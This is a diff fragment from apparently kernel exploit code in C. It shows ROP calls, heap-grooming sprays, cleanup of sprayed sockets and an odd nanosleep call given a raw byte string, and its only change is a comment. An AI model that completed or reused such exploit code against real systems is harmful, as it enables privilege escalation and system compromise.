@@ -346,7 +346,7 @@ for (int attempts = 0; attempts < 10; attempts++) {
         pin_to_cpu(cpu);
         rop_call_funcptr(spray_map, NULL, kernel_base); // Remaining cores for malloc sprays (Heap Grooming)
     }
-	for (int i = 0; i < 512; i++) // Clean sockets spray
+	for (int i = 0; i < 512; i++) // Clean sockets spray for OS stability
     close(spray_sock[i]);
 	nanosleep("\0\0\0\0\0\0\0\0\x00\x00\x20\xA1\07\0\0\0", NULL); // Safety exit
 	return 0;
